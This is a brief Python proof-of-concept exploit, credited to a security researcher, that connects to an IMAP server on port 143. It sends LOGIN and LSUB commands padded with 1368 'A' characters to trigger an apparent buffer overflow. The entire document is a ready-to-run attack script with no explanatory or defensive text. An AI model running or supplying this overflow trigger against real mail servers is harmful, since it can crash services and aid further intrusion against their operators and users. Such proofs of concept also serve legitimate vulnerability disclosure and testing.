#!/usr/bin/python
#
# Francis Provencher for Protek Research Lab's.
#
#
 
 
import socket
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
buffer = '\x41' * 1368
 
s.connect(('192.168.100.178',143))
s.recv(1024)
s.send('A001 LOGIN test  test ' + buffer + '\r\n')
s.recv(1024)
s.send('A001 LSUB aa ' + buffer + '\r\n')
s.recv(1024)
s.close()
